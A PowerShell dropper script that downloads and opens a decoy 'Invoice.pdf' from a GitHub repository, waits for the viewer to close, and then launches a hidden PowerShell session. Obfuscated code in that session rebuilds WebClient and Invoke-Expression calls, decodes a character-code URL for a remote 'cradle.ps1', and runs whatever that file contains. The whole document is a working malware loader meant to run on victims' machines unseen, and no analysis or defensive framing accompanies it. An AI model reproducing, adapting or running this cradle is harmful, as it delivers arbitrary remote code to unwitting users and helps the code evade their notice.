$pdfUrl  = "https://raw.githubusercontent.com/Brothersextremegaming/pwshcradle/refs/heads/main/Invoice.pdf"
$pdfPath = Join-Path ([Environment]::GetFolderPath("MyDocuments")) "file.pdf"

$browserPaths = @(
    "C:\Program Files\Google\Chrome\Application\chrome.exe",
    "C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
    "C:\Program Files\Opera\opera.exe",
    "C:\Program Files\Opera GX\opera.exe",
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "C:\Program Files\Mozilla Firefox\firefox.exe"
)

$browserProcessNames = @(
    "chrome",
    "brave",
    "opera",
    "msedge",
    "firefox"
)
powershell -NoP -sta -NonI -W Hidden

Invoke-WebRequest -Uri $pdfUrl -OutFile $pdfPath -ErrorAction SilentlyContinue

$browser = $browserPaths | Where-Object { Test-Path $_ } | Select-Object -First 1

if ($browser) {
    Start-Process -FilePath $browser -ArgumentList "`"$pdfPath`"" -ErrorAction SilentlyContinue
} else {
    Start-Process $pdfPath -ErrorAction SilentlyContinue
}

function Get-PDFRenderer {
    $procs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
    $procs | Where-Object {
        $name = $_.Name -replace "\.exe$", ""
        ($browserProcessNames -contains $name) -and
        ($_.CommandLine -match "\.pdf")
    } | Select-Object ProcessId, Name, CommandLine
}

do {
    $pdfProcesses = Get-PDFRenderer
    if ($pdfProcesses) {
        Start-Sleep -Seconds 20
    }
} while ($pdfProcesses)

powershell -NoP -sta -NonI -W Hidden -enc
$7g4p = & (("7xujowmINO4Xc0F9sBp8Ci-QzvREqKDMerVT15n2YZGHkAWglhUbd6yfta3JLPS")[8,32,5,22,9,51,3,32,12,56] -join '') $([char](0+83-0)+[char](0+121-0)+[char](58+115-58)+[char](0+116-0)+[char](0+101-0)+[char](81+109-81)+[char](17*46/17)+[char](111*78/111)+[char](0+101-0)+[char](0+116-0)+[char](47*46/47)+[char](73*87/73)+[char](0+101-0)+[char](75*98/75)+[char](73+67-73)+[char](0+108-0)+[char](66*105/66)+[char](96+101-96)+[char](0+110-0)+[char](121*116/121)); $J3B0WySt6VCmAh7jb = ([string]::join('', ( (104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,66,114,111,116,104,101,114,115,101,120,116,114,101,109,101,103,97,109,105,110,103,47,112,119,115,104,99,114,97,100,108,101,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,99,114,97,100,108,101,46,112,115,49) |<##>%{$_}<##>|%{ ( [char][int] $_)})) |<##>%{$_}<##>| % {$_}); $7g4p.DownloadString($J3B0WySt6VCmAh7jb) |<##>%{$_}<##>| & (("czibl21f3ByKvwLe6XAC7p4tmnoZd8EGs9U5jkrTHqWFS0PJxOhQNaIgD-uVMYR")[54,25,12,26,37,15,57,30,48,21,38,15,32,32,2,26,25] -join '')

